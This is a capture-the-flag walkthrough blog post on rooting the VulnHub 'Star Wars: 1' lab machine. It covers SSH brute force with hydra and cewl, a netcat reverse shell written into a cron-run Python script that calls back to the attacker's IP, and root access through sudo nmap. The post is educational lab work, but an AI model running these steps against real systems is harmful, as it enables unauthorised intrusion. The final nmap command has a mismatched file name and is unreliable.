<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Star Wars: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/star-wars-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-19T18:22:30+00:00">September 19, 2020</time><time class="updated" datetime="2025-07-10T18:21:19+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to root a vulnhub machine “star-wars-ctf-1”. It contains one flag that is accessible after gaining root privilege on the machine. It is developed by Sir Logic team difficulty level of this machine is for beginners. Our goal is to gain root shell access.</span></p>
<p><span style="color: #000000;">Download it from here:<span style="color: #0000ff;"><strong> <u><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/star-wars-ctf-1,528/">https://www.vulnhub.com/entry/star-wars-ctf-1,528/</a></u></strong></span></span></p>
<h3><span style="color: #800000;"><strong>Table of Content:</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
<li><span style="color: #000000;">Dirb</span></li>
<li><span style="color: #000000;">Steganography Online decrypt tool</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">hydra</span></li>
<li><span style="color: #000000;">SSH Login</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Post Enumeration</span></li>
<li><span style="color: #000000;">Abusing writeable script</span></li>
<li><span style="color: #000000;">Root access</span></li>
</ul>
<h3><span style="color: #000000;"><strong>WalkThrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
<h4><span style="color: #800000;">netdiscover</span></h4>
<p><span style="color: #000000;">Let’s start reconnaissance for the vulnerable machine by using netdiscover. Through this command, we can identify the IP address of the various devices in our network and eventually finding the IP address of our target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fFKck3rB4CQ/X2ZFOc9mPFI/AAAAAAAAoqA/oUJb3RgzugwYwDAAg4OrJxruxM8ACwSxwCLcBGAsYHQ/s16000/1.png"/></span></p>
<h4><span style="color: #800000;">Nmap</span></h4>
<p><span style="color: #000000;">As we got our target IP address for the machine (192.168.0.188), And now that we know our target IP, let’s scan it with the help of Nmap and move forward with the process of information gathering on the target host. In the following command, “-A” means Aggressive scanning.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.0.188</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZT3KnUjn0us/X2ZFwSrY8II/AAAAAAAAoqM/apSAcAk0caopa_2lFNW4702rdXPC3GsGQCLcBGAsYHQ/s16000/2.png"/></span></p>
<h4><span style="color: #800000;">Steganography Online decrypt tool</span></h4>
<p><span style="color: #000000;">So, we come to know that only two ports are open here i.e. 22 and 80. And since the port 80 is open, Let’s explore the domain or webpage on this target IP address using any browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LDZGbn0ccCA/X2ZF85jll6I/AAAAAAAAoqU/UlW1QoDQBzERagxqq-T03eFKJtrYrQzxQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">The webpage hinted us to find the password hence the search for it is commenced. For the password to be known, we are checking the source code of the webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gnMP73wKfnQ/X2ZGJ38RnEI/AAAAAAAAoqY/SFlReNYcpQIR3UOf01bv0aG-2OU2w6IegCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">In the source code, the author has given a hint regarding password i.e. “password is here” and below that there is a string of text which indicates that there is a password hidden here somewhere. When nothing worked, we downloaded the image from the main page in the hope that there must be some data hidden behind it by the method os steganography. </span><span style="color: #000000;">To use steganography Click the URL <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></u></strong></span> and upload the image then click the decoded image for extracting passwords.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--JteOlFbwV0/X2ZHDn1X5yI/AAAAAAAAoq8/W1V_sdPMmF4X_2ZGFAuF-9zEQy_jY_GKwCLcBGAsYHQ/s16000/6.png"/></span></p>
<h4><span style="color: #800000;">Dirb</span></h4>
<p><span style="color: #000000;">We got the password “babyYoda123”, but we don’t know the username, therefore we will brute attack the directory using dirb tool for enumerating web directories.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://192.168.0.188</pre>
<p><span style="color: #000000;">As a result of dirb we found few directories, but we more interested in robots.txt file.</span></p>
<p><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-tUOsenXy44A/X2ZHOqvwtbI/AAAAAAAAorA/bJ6Jz6dx4es_Eajqhu-N9NMrqRNYlIjrACLcBGAsYHQ/s16000/7.png"/> </span></p>
<p><span style="color: #000000;">We navigated to the URL <u>http://192.168.0.188/robots.txt</u> and found a webpage named “/r2d2” but we still have to find a username.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JL_fStuZH4w/X2ZHZq-AV6I/AAAAAAAAorI/CPIykZVIK184-0mWdrohCsvyvNPXHPYbwCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">As we can see didn’t find any username, further, we again used dirb tool, and this time we were looking for PHP, .js, and/or .txt extension file types.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://192.168.0.188/ -X .php,.js,.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MW8rK3RI-ps/X2ZHnK6y9qI/AAAAAAAAorQ/bXsO96zldlkuBbTdrzSu21WS731GVREdgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">And from the result of the above command, we found  <strong>user.js,</strong> let’s explore this. When </span><span style="color: #000000;">we opened the<strong> user.js</strong> in the browser, two entries which could the usernames: skywalker and han were found.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fI8_4JgaChM/X2ZHyqmvg8I/AAAAAAAAorY/SIFis9LBxwk8lmJPPMN5UUIYaANCE79CgCLcBGAsYHQ/s16000/10.png"/></span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<h4><span style="color: #800000;">hydra</span></h4>
<p><span style="color: #000000;">Now that we have both usernames and passwords, we can perform the various password attacks such as the brute force on SSH. For brute force, we will try the tool hydra. We created a users.txt file and we have a password (babyYoda123), now we have to crack the valid username with password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L users.txt -p babyYoda123 192.168.0.188 ssh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lKXhh0__tBk/X2ZH9lmI4yI/AAAAAAAAorg/7lM3Kqa6CRws9sK0EgIQciCR72UcmGlMgCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">As you can observe in the image above, only one valid<strong> username: han</strong> for the password: babyYoda123.</span></p>
<h4><span style="color: #800000;">SSH Login</span></h4>
<p><span style="color: #000000;">After logging into SSH, we move for post enumeration and found a hidden file named as <strong>.secrets </strong>that contain a text file “note.txt”. This file looks like a hint for us, where the author wants us to use Cewl for making a wordlist.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh han@192.168.0.188
ls -la
cd .secrets
ls -la
cat note.txt</pre>
<p><span style="color: #000000;">Further, we check passwd file for enumerating user account and we saw han, starwalker &amp; Darth as usernames.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail /etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VhCCEwUcew8/X2ZIM85FT4I/AAAAAAAAoro/4dhSkvTXLukyGoveyCHlhG6a6pU3Am1CACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">As you can see, we have found the robots.txt which has given a hint for /r2d2. So, we explored it in the web browser and obtain a web page as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fEY1j1KS8l0/X2ZIXqI54CI/AAAAAAAAorw/U3XiPzDBDFcqPju2Iy8-MBEfwsI5Sg4SQCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">If you remember the author has given hint i.e. cewl. Hence with the help of cewl command, we created a dict.txt file and used the dict.txt file as a password list for our brute attack over SSH for user skywalker.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cewl http://192.168.0.188/r2d2 &gt; dict.txt
hydra -l skywalker -P dict.txt 192.168.0.188 ssh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VgMx2SOPpXM/X2ZIjVb9RGI/AAAAAAAAor4/qd7t03TLNjYsq7FxBRRt9HiYFZQVFV-IQCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">As you can observe from the image above, the previous commands have helped us in finding a valid password for the skywalker. Now we will switch the user han to skywalker.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su skywalker
ls -la
cd .secrets
ls -la</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DEWGkfyF8bk/X2ZIuVYlYGI/AAAAAAAAosA/J7AjqOOfTbgeX4RjWn61XzrSjpxlnlHmACLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">After switching the user, we found a hidden directory named <strong>.secret.</strong> Upon exploring, we found that this directory contains a text file called “note.txt”. This file can be a hint for us, so we decided to check it. In the file, the author mentioned: “Darth must take up the job of being a good father”. From this, we can be sure that Darth is the user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BXH43bJhcjU/X2ZI4Qekl9I/AAAAAAAAosI/vDRar-xCVjQ2_0IwYesHN_aq2p8h0Q6bgCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">After switching to the home directory, we found a folder named Darth that contains a hidden directory named as <strong>.secrets </strong>that contain a python file “evil.py”. As you can see in the above image, there is a read and write executable python file, also this file is executing after one minute.</span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Since the evil.py script was writable, therefore, we edit the evil.py to the get reverse shell as Darther over netcat.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano evil.py
import os
os.system("nc -e /bin/bash 192.168.0.147 1234")</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L258RiPIE0U/X2ZJJfBIqbI/AAAAAAAAosQ/QeUw-g2lSDoa63i4Pc2C0gNDpmDnQYbjQCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">In a new terminal, we run Netcat listener to obtain the reverse connection after one minute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;">And after one minute we obtained a session as Darth user, further we used python one-liner to obtain the proper TTY shell and then check the sudo privilege for user Darth.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty; pty.spawn("/bin/bash")'
sudo -l</pre>
<p><span style="color: #000000;">We found that the user Darth own sudo right for NMAP, thus without wasting much time, we write root.nse script inside /tmp to run /bin/bash for root privilege Escalation when executing through nmap.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo echo "os.execute(/bin/sh)" &gt; /tmp/nmap.nse
sudo nmap --script=/tmp/root.nse
id
cd /root
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IcgSsJhHOk0/X2ZJZK0OctI/AAAAAAAAosY/8e_8Wx2YHjsd_1k3Sll-g0m-hnhKresJwCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">Booom!!! We have completed the task and obtain the final flag of the machine</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Madhava Rao Yejarla is an Ethical Hacker, Security Analyst, Penetration Tester from India. Contact on <strong><a style="color: #000000;" href="https://www.linkedin.com/in/yejarla-madhava-rao-b285b5b1/">LinkedIn</a> </strong>or <strong><a style="color: #000000;" href="https://twitter.com/YejarlaMadhava" data-saferedirecturl="https://www.google.com/url?q=https://www.linkedin.com/mwlite/in/yejarla-madhava-rao-b285b5b1&amp;source=gmail&amp;ust=1586846757025000&amp;usg=AFQjCNFC8mQwK4xoGPpotVKcAlO7SIxW-A">Twitter</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
